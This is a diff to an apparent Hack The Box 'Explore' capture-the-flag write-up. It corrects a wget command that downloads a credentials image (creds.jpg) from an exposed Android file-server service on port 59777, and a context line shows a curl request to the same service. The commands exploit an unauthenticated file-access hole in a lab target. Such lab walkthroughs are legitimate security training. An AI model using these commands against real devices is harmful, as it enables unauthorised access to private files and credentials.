@@ -198,7 +198,7 @@ curl -X POST -H "Content-Type: application/json" -d '{"command":"listPics"}' htt
 From the blog post, we know that we can directory access and download files from the system using a `GET` request to its path. We can do this by using `wget`.
 
 ```bash
-wget -X "Content-Type: application/json" http://explore.htb:59777/storage/emulated/0/DCIM/creds.jpg
+wget http://explore.htb:59777/storage/emulated/0/DCIM/creds.jpg
 ```
 
 ![creds.jpg](/images/writeups/htb-explore/creds.png)
